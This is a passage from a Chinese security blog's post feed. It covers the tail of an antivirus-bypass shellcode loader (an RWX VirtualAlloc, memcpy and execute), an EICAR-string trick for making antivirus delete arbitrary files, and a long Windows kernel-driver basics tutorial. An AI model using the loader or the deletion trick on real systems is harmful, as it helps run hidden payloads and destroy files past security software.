class="string">&quot;%2X&quot;</span>, &amp;char_in_hex);</span><br><span class="line">		shellcode[i] = (<span class="type">char</span>)char_in_hex;  </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">	<span class="type">void</span>* exec = VirtualAlloc(<span class="number">0</span>, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, shellcode, memory_allocation);</span><br><span class="line">	  </span><br><span class="line">	(*(<span class="type">void</span>(*WINAPI)()) exec)();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软拦截规则</title>
    <url>/posts/59de0ce9/</url>
    <content><![CDATA[<h4 id="杀软拦截规则"><a href="#杀软拦截规则" class="headerlink" title="杀软拦截规则"></a>杀软拦截规则</h4><p><img src="/posts/59de0ce9/1.png"></p>
<h4 id="利用杀软规则删除任意文件"><a href="#利用杀软规则删除任意文件" class="headerlink" title="利用杀软规则删除任意文件"></a>利用杀软规则删除任意文件</h4><p><code>X5O!P%@AP[4\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</code></p>
<p><strong>EICAR 标准反病毒测试文件</strong>，又称<strong>EICAR 测试文件</strong>, 是由<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%B4%B2%E5%8F%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E5%8D%8F%E4%BC%9A">欧洲反计算机病毒协会</a>（EICAR）与<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E7%A0%94%E7%A9%B6%E7%BB%84%E7%BB%87&action=edit&redlink=1">计算机病毒研究组织</a>（CARO）研制的文件, 用以测试<a href="https://zh.wikipedia.org/wiki/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6">杀毒软件</a>的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。，并不是真正的病毒，主要用于测试杀毒软件。</p>
<p><code>echo X5O!P%@AP[4\PZX54(P^^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*  &gt; &lt;FILENAME&gt;</code></p>
<p>杀毒软件在运行时考虑到内存占用可能不会加载自己的全部 dll, 那么将这个测试代码写到想要去删除的文件时，当用到这个 dll 后杀软就会查杀到该文件为恶意文件进行删除，此时该调用的 dll 就会失效。</p>
<p>在测试下，火绒、卡巴斯基会直接将含有该测试代码的文件直接隔离删除，360、Windef 会询问是否删除。</p>
<p><img src="/posts/59de0ce9/2.png"></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动-4-64位内核挂钩</title>
    <url>/posts/8f299aa4/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>驱动-3-32位内核挂钩</title>
    <url>/posts/62289487/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>驱动-2_内核编程基础</title>
    <url>/posts/dc4ad149/</url>
    <content><![CDATA[<h4 id="内核API参考文档"><a href="#内核API参考文档" class="headerlink" title="内核API参考文档"></a>内核API参考文档</h4><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/_kernel/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/_kernel/</a></p>
<h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h4><p>在内核编程时遵守WDK编码习惯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ULONG(<span class="type">unsigned</span> <span class="type">long</span>)		PULONG(<span class="type">unsigned</span> <span class="type">long</span>*)</span><br><span class="line">UCHAR(<span class="type">unsigned</span> <span class="type">char</span>)		PUCHAR(<span class="type">unsigned</span> <span class="type">char</span>*)</span><br><span class="line">UINT(<span class="type">unsigned</span> <span class="type">int</span>)			PUINT(<span class="type">unsigned</span> <span class="type">int</span>*)</span><br><span class="line">VOID(<span class="type">void</span>)					PVOID(<span class="type">void</span>*)</span><br></pre></td></tr></table></figure>

<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>大部分内核函数的返回值都是  NTSTATUS类型，它本质是一个宏，里面包含的类型有很多，如下三个就是常见的返回值: </p>
<table>
<thead>
<tr>
<th>宏名称</th>
<th>实际值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>STATUS_SUCCESS</td>
<td>0x00000000</td>
<td>成功</td>
</tr>
<tr>
<td>STATUS_INVALID_PARAMETER</td>
<td>0xC000000D</td>
<td>参数无效</td>
</tr>
<tr>
<td>STATUS_BUFFER_OVERFLOW</td>
<td>0x80000005</td>
<td>缓冲区长度不够</td>
</tr>
</tbody></table>
<p>当调用内核函数失败时 即返回结构不是STATUS_SUCCESS 那么可以根据返回值在 ntstatus.h 头文件中去查找 也可在微软的SDK文档搜索相关宏名称</p>
<p><img src="/posts/dc4ad149/1.png" alt="img"></p>
<h4 id="内核中的异常处理"><a href="#内核中的异常处理" class="headerlink" title="内核中的异常处理"></a>内核中的异常处理</h4><p> 在内核中一个小小的错误就可能导致蓝屏，例如我们去读写一个无效的内存地址。为了让自己的内核程序更加 健壮，在编写内核程序时要使用到异常处理。                         </p>
<p>在Windows下提供了结构化异常处理机制，编译器普遍都支持，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 填入可能要出错的代码 &#125;</span></span><br><span class="line">__except (filter_value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 填入出错后要执行的代码 &#125;</span></span><br></pre></td></tr></table></figure>

<p>如上示例中的filter_value，就是当内核程序出现异常时决定程序如何执行的，一般有这三种情况: </p>
<table>
<thead>
<tr>
<th>宏名称</th>
<th>实际值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>EXCEPTION_EXECUTE_HANDLER</td>
<td>1</td>
<td>进入except代码块执行</td>
</tr>
<tr>
<td>EXCEPTION_CONTINUE_SEARCH</td>
<td>0</td>
<td>不处理异常，由上一层调用函数处理</td>
</tr>
<tr>
<td>EXCEPTION_CONTINUE_EXECUTION</td>
<td>-1</td>
<td>继续执行错误处的代码</td>
</tr>
</tbody></table>
<h4 id="常用的内核内存函数"><a href="#常用的内核内存函数" class="headerlink" title="常用的内核内存函数"></a>常用的内核内存函数</h4><p>对内存的使用主要是 申请、设置、拷贝、释放 常用函数如下集合应用层与内核层对比</p>
<table>
<thead>
<tr>
<th>应用层</th>
<th>内核</th>
</tr>
</thead>
<tbody><tr>
<td>malloc</td>
<td>ExAllocatePool</td>
</tr>
<tr>
<td>memset</td>
<td>RtlFillMemory</td>
</tr>
<tr>
<td>memcpy</td>
<td>RtlMoveMemory</td>
</tr>
<tr>
<td>free</td>
<td>ExFreePool</td>
</tr>
</tbody></table>
<h5 id="使用内存"><a href="#使用内存" class="headerlink" title="使用内存"></a>使用内存</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分配</span></span><br><span class="line">PVOID <span class="title function_">ExAllocatePoolWithTag</span><span class="params">(</span></span><br><span class="line"><span class="params">  POOL_TYPE PoolType, <span class="comment">//申请的内存类型 常用值：NonPagedPool表示可执行的非分页内存，PagedPool分页内存，NonPagedPoolNx不可执行的非分页内存 Nx不可执行</span></span></span><br><span class="line"><span class="params">  SIZE_T NumberOfBytes,<span class="comment">//申请的内存大小，单位字节</span></span></span><br><span class="line"><span class="params">  ULONG Tag<span class="comment">//4字节的标志，用于调试，不关心传递0或者使用ExAllocatePool</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//分配成功返回内存首地址，失败返回NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//释放</span></span><br><span class="line">VOID <span class="title function_">ExFreePoolWithTag</span> <span class="params">(</span></span><br><span class="line"><span class="params">    PVOID P,<span class="comment">//内存块地址</span></span></span><br><span class="line"><span class="params">    ULONG Tag<span class="comment">//申请时的标记</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="comment">//ExAllocatePool对应释放函数ExFreePool </span></span><br></pre></td></tr></table></figure>

<h4 id="内核中的字符串"><a href="#内核中的字符串" class="headerlink" title="内核中的字符串"></a>内核中的字符串</h4><h5 id="内核字符串种类"><a href="#内核字符串种类" class="headerlink" title="内核字符串种类"></a>内核字符串种类</h5><p>CHAR(char)、WCHAR(wchar_t)、ANSI_STRING、UNICODE_STRING </p>
<p>CHAR是char在内核中的写法，WCHAR是wchar_t是在内核中的写法，但是一般不建议使用这两种 而使用后两者 <strong>ANSI_STRING</strong>和<strong>UNICODE_STRING（Ascii/Unicode）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	<span class="meta">#<span class="keyword">ifdef</span> MIDL_PASS</span></span><br><span class="line">	[size_is(MaximumLength), length_is(Length) ]</span><br><span class="line">	<span class="meta">#<span class="keyword">endif</span> <span class="comment">// MIDL_PASS</span></span></span><br><span class="line">	Field_size_bytes_part_opt_(MaximumLength, Length) PCHAR Buffer;</span><br><span class="line">&#125; STRING;</span><br><span class="line"><span class="keyword">typedef</span> STRING ANSI_STRING</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	<span class="meta">#<span class="keyword">ifdef</span> MIDL_PASS</span></span><br><span class="line">	[size_is(MaximumLength / <span class="number">2</span>), length_is((Length) / <span class="number">2</span>) ] USHORT * Buffer;</span><br><span class="line">	<span class="meta">#<span class="keyword">else</span> <span class="comment">// MIDL_PASS</span></span></span><br><span class="line">	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span> <span class="comment">// MIDL_PASS</span></span></span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure>

<h5 id="内核字符串函数"><a href="#内核字符串函数" class="headerlink" title="内核字符串函数"></a>内核字符串函数</h5><p>字符串的操作就是创建、复制、比较、转换，但由于编码问题在内核中也有不同的函数表达: </p>
<table>
<thead>
<tr>
<th>ANSI_STRING字符串</th>
<th>UNICODE_STRING字符串</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>RtlInitAnsiString</td>
<td>RtlInitUnicodeString</td>
<td>创建字符串</td>
</tr>
<tr>
<td>RtlCopyString</td>
<td>RtlCopyUnicodeString</td>
<td>字符串复制</td>
</tr>
<tr>
<td>RtlCompareString</td>
<td>RtlCompareUnicoodeString</td>
<td>字符串比较</td>
</tr>
<tr>
<td>RtlAnsiStringToUnicodeString</td>
<td>RtlUnicodeStringToAnsiString</td>
<td>编码转换</td>
</tr>
</tbody></table>
<h5 id="内核字符串操作"><a href="#内核字符串操作" class="headerlink" title="内核字符串操作"></a>内核字符串操作</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//UNICODE_STRING初始化</span></span><br><span class="line">UNICODE_STRING Demostring = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitUnicodeString(&amp;Demostring, <span class="string">L&quot;This is a ....\n&quot;</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>, &amp;Demostring);</span><br><span class="line"><span class="comment">//浅拷贝（只拷贝地址 将地址指向同一地方） 将buffer指向字符串的地址</span></span><br><span class="line">UNICODE_STRING naizistring = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR str[] = <span class="string">L&quot;hacker...\n&quot;</span>;</span><br><span class="line">RtlInitUnicodeString(&amp;naizistring, str);</span><br><span class="line">str[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>, &amp;naizistring);</span><br><span class="line"><span class="comment">//深拷贝(copy)</span></span><br><span class="line"><span class="comment">//#include &quot;Ntstrfase.h&quot;</span></span><br><span class="line">WCHAR str[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">UNICODE_STRING naizistring = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlInitEmptyUnicodeString(&amp;naizistring, str, <span class="keyword">sizeof</span>(str));</span><br><span class="line">RtlUnicodeStringCopyString(&amp;naizistring, <span class="string">L&quot;naizi hacker&quot;</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>, &amp;naizistring);</span><br></pre></td></tr></table></figure>

<h4 id="内核空间与内存模块"><a href="#内核空间与内存模块" class="headerlink" title="内核空间与内存模块"></a>内核空间与内存模块</h4><p>进程中有一个4GB大小的内存空间  低2G是程序自己的 高2G是共享的</p>
<p><img src="/posts/dc4ad149/2.png" alt="img"></p>
<p>按照规定格式编写的驱动 每一个都可以当做一个模块，也可以称之为内核模块，都遵循PE结构，并可以加载到内核中</p>
<p>在编写时 一般都需要一个入口函数和一个卸载函数</p>
<p>在入口函数中需要两个参数  <strong>PDRIVER_OBJECT</strong> 和 <strong>PUNICODE_STRING</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING   RegistryPath)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/3.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">	CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PVOID DriverStart; <span class="comment">// 结构体对应的驱动程序在内核空间的位置</span></span><br><span class="line">    ULONG DriverSize; <span class="comment">// 结构体对应的驱动程序的大小</span></span><br><span class="line">    PVOID DriverSection; <span class="comment">// 指针，指向_LDR_DATA_TABLE_ENTRY结构体 PDRIVER_EXTENSION DriverExtension;</span></span><br><span class="line">    UNICODE_STRING DriverName; <span class="comment">// 结构体对应的驱动程序的名字 PUNICODE_STRING HardwareDatabase;</span></span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload; <span class="comment">// 定义驱动程序卸载函数的地址 PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];</span></span><br><span class="line"> &#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span></span><br></pre></td></tr></table></figure>

<p>通过之前的demoDriver 可以找到驱动对象地址</p>
<p><img src="/posts/dc4ad149/4.png" alt="img"></p>
<p>通过windbg进入到其中查看                                     </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _DRIVER_OBJECT 驱动对象地址 </span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/5.png" alt="img"></p>
<p>DriverSection; // 指针  指向_LDR_DATA_TABLE_ENTRY结构体 ,在该结构体内有一个成员InLoadOrderLinks是双链表，它记录着前一个和后一个内核模块的_LDR_DATA_TABLE_ENTRY结构体地址: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _LDR_DATA_TABLE_ENTRY  0xffffc90e4c1f98d0</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/6.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dt _LDR_DATA_TABLE_ENTRY 0xffffc90e4cc04a10</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/7.png" alt="img"></p>
<h4 id="应用与内核间通信"><a href="#应用与内核间通信" class="headerlink" title="应用与内核间通信"></a>应用与内核间通信</h4><h5 id="创建设备对象"><a href="#创建设备对象" class="headerlink" title="创建设备对象"></a>创建设备对象</h5><p>正常情况下，一个设备对象是对应一个设备的，如:鼠标、键盘。但是设备对象也可以是一个抽象的概念，不 对应到具体某个硬件，也就是我们可以使用如下代码去创建一个设备对象。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS Status;	<span class="comment">//初始化返回状态</span></span><br><span class="line">UNICODE_STRING DeviceName;	<span class="comment">// 创建设备名称</span></span><br><span class="line">UNICODE_STRING SymbolName;	<span class="comment">//符号链接</span></span><br><span class="line">PDEVICE_OBJECT dev = <span class="literal">NULL</span>;<span class="comment">//初始化 控制设备</span></span><br><span class="line">RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>); <span class="comment">// 设备名称 PDEVICE_OBJECT pDeviceObj = NULL;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建设备对象</span></span><br><span class="line">Status = IoCreateDevice(</span><br><span class="line">    DriverObject, <span class="comment">// 调用方驱动程序对象</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &amp;DeviceName, <span class="comment">// 设备名称</span></span><br><span class="line">    FILE_DEVICE_UNKNOWN, <span class="comment">// 设备类型，当前不与某个具体设备挂钩，所以类型为UNKNOWN </span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//FILE_DEVICE_SECURE_OPEN, // 设备属性，大多数驱动程序仅指定 FILE_DEVICE_SECURE_OPEN 属性， 这可确保将相同的安全设置应用到设备的命名空间中的任何打开的请求</span></span><br><span class="line">    TRUE,<span class="comment">//FALSE, // 设备对象是否表示独占设备，如果启用了对设备的独占访问，则一次只能打开设备的一个句柄 </span></span><br><span class="line">    &amp;dev <span class="comment">// 创建的设备对象，指向接收指向新创建的 DEVICE_OBJECT 结构的指针的变量的指针</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status))<span class="comment">//不成功</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (Status == STATUS_OBJECT_NAME_COLLISION)<span class="comment">//名称冲突</span></span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[*]设备名称冲突......\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]创建失败&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//初始化符号链接  (设备应用程序不可见 因此驱动要暴漏一个符号链接给应用层</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		Status = IoCreateSymbolicLink(&amp;SymbolName, &amp;DeviceName);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123; <span class="comment">//不等于0</span></span><br><span class="line">			IoDeleteDevice(dev); <span class="comment">//删除设备</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]删除设备成功&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]创建符号链接成功&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Status;</span><br></pre></td></tr></table></figure>

<h5 id="数据交换配置"><a href="#数据交换配置" class="headerlink" title="数据交换配置"></a>数据交换配置</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置交换数据方式</span></span><br><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO; <span class="comment">// 缓冲区读写</span></span><br></pre></td></tr></table></figure>

<p>创建好设备对象之后，就需要设置0环和3环交换数据的方式，有以下三种方式:</p>
<ul>
<li><p>\1. 缓冲区读写(<strong>DO_BUFFERED_IO</strong>)，操作系统将应用程序提供缓冲区的数据直接复制到内核模式下的地址中;</p>
</li>
<li><p>\2. 直接读写(<strong>DO_DIRECT_IO</strong>)，操作系统会将用户模式下的缓冲区锁住，然后操作系统将这段缓冲区在 内核模式地址再次映射一遍，这样用户模式的缓冲区和内核模式的缓冲区指向的是同一区域的物理内 存，缺点就是要单独占用物理页面;</p>
</li>
<li><p>\3. 其他读写（0环直接读取3环线性地址），在调用IoCreateDevice函数创建设备后不设置交换数据模式即默认为其他方式读写，在使用 其他方式读写设备时，派遣函数直接读写应用程序提供的缓冲区地址。在驱动程序中，直接操作应用程 序的缓冲区地址是很危险的(<strong>不建议使用</strong>)，只有驱动程序与应用程序运行在相同线程上下文的情况下，才能使用这种方式。</p>
</li>
</ul>
<h5 id="设备符号连接"><a href="#设备符号连接" class="headerlink" title="设备符号连接"></a>设备符号连接</h5><p>设备名称是给0环使用的，如果3环想要访问到设备就需要通过符号连接，可以理解成它是一个设备的别名，如果不这样设置 3环无法访问到设备。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建符号链接</span></span><br><span class="line">UNICODE_STRING DeviceName;<span class="comment">//设备名称</span></span><br><span class="line">UNICODE_STRING SymbolName;<span class="comment">//符号链接</span></span><br><span class="line">RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>注意:</p>
<p>设备名称的作用是给内核对象使用的，如果要在Ring3访问 必须有符号链接(可以理解为是设备的别名)，没有这个在RIng3下不可见</p>
<p>内核模式下符号链接名是以<code>\??\</code>开头  如 C盘就是 <code>\??\C:</code></p>
<p>用户模式下符号链接名则是以<code>\\.\</code>开头 如C盘就是 <code>\\.\C:</code></p>
<p>在实际代码中需要对 <code>\</code> 转义为 <code>\\</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">L&quot;\\??\\MyDriverDemo&quot;</span>   	\\??\MyDriverDemo</span><br><span class="line"><span class="string">L&quot;\\\\.\\MyDriverDemo&quot;</span>		\\.\MyDriverDemo</span><br><span class="line">PDEVICE_OBJECT dev = <span class="literal">NULL</span>;<span class="comment">//初始化 控制设备</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">CreateDevice</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    NTSTATUS Status;	<span class="comment">//初始化返回状态</span></span><br><span class="line">    UNICODE_STRING DeviceName;	<span class="comment">// 创建设备名称</span></span><br><span class="line">    UNICODE_STRING SymbolName;	<span class="comment">//符号链接</span></span><br><span class="line">    RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>); <span class="comment">// 设备名称 PDEVICE_OBJECT pDeviceObj = NULL;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建设备对象</span></span><br><span class="line">    Status = IoCreateDevice(</span><br><span class="line">        DriverObject, <span class="comment">// 调用方驱动程序对象</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;DeviceName, <span class="comment">// 设备名称</span></span><br><span class="line">        FILE_DEVICE_UNKNOWN, <span class="comment">// 设备类型，当前不与某个具体设备挂钩，所以类型为UNKNOWN </span></span><br><span class="line">        <span class="number">0</span>,<span class="comment">//FILE_DEVICE_SECURE_OPEN, // 设备属性，大多数驱动程序仅指定 FILE_DEVICE_SECURE_OPEN 属性， 这可确保将相同的安全设置应用到设备的命名空间中的任何打开的请求</span></span><br><span class="line">        TRUE,<span class="comment">//FALSE, // 设备对象是否表示独占设备，如果启用了对设备的独占访问，则一次只能打开设备的一个句柄 </span></span><br><span class="line">        &amp;dev <span class="comment">// 创建的设备对象，指向接收指向新创建的 DEVICE_OBJECT 结构的指针的变量的指针</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status))<span class="comment">//不成功</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (Status == STATUS_OBJECT_NAME_COLLISION)<span class="comment">//名称冲突</span></span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[*]设备名称冲突......\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]创建失败&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//初始化符号链接  (设备应用程序不可见 因此驱动要暴漏一个符号链接给应用层</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		Status = IoCreateSymbolicLink(&amp;SymbolName, &amp;DeviceName);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123; <span class="comment">//不等于0</span></span><br><span class="line">			IoDeleteDevice(dev); <span class="comment">//删除设备</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]删除设备成功&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[+]创建符号链接成功&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="派遣函数与IRP类型"><a href="#派遣函数与IRP类型" class="headerlink" title="派遣函数与IRP类型"></a>派遣函数与IRP类型</h5><p>当单击鼠标时会产生MSG消息，该消息发送给窗口对象，在窗口对象内会根据消息序号找到对应的处理函数进行处理。同理，在驱动程序中，当在3环使用了某个函数就会产生IRP消息，该消息发送给设备对象，在设备对象内会根据消息类型选择对应的派遣函数处理。</p>
<p><img src="/posts/dc4ad149/8.png" alt="img">                                         </p>
<p>常见的IRP类型与其对应的3环下的函数及作用如下所示: </p>
<table>
<thead>
<tr>
<th>IRP类型</th>
<th>来源函数</th>
<th>函数作用</th>
</tr>
</thead>
<tbody><tr>
<td>IRP_MJ_CREATE</td>
<td>CreateFile</td>
<td>打开设备</td>
</tr>
<tr>
<td>IRP_MJ_READ</td>
<td>ReadFile</td>
<td>从设备中读取数据</td>
</tr>
<tr>
<td>IRP_MJ_WRITE</td>
<td>WriteFile</td>
<td>从设备中写入数据</td>
</tr>
<tr>
<td>IRP_MJ_CLOSE</td>
<td>CloseHandle</td>
<td>关闭设备</td>
</tr>
<tr>
<td>IRP_MJ_DEVICE_CONTROL</td>
<td>DeviceIoControl</td>
<td>设备控制，比读取、写入操作更加灵活</td>
</tr>
<tr>
<td>IRP_MJ_POWER</td>
<td>X</td>
<td>在操作系统处理电源消息时产生该类型</td>
</tr>
<tr>
<td>IRP_MJ_SHUTDOWN</td>
<td>X</td>
<td>关闭系统前会产生该类型</td>
</tr>
</tbody></table>
<p>想注册某个IRP类型对应的派遣函数时候可以使用如下格式 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP类型] = 派遣函数名</span><br></pre></td></tr></table></figure>

<p>//MajorFunction是一个具有28个成员的数组 对应着28种IRP类型</p>
<p><img src="/posts/dc4ad149/9.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                   0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE_NAMED_PIPE        0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                    0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_READ                     0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_WRITE                    0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_INFORMATION        0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_INFORMATION          0x06</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_EA                 0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_EA                   0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_FLUSH_BUFFERS            0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_VOLUME_INFORMATION   0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DIRECTORY_CONTROL        0x0c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 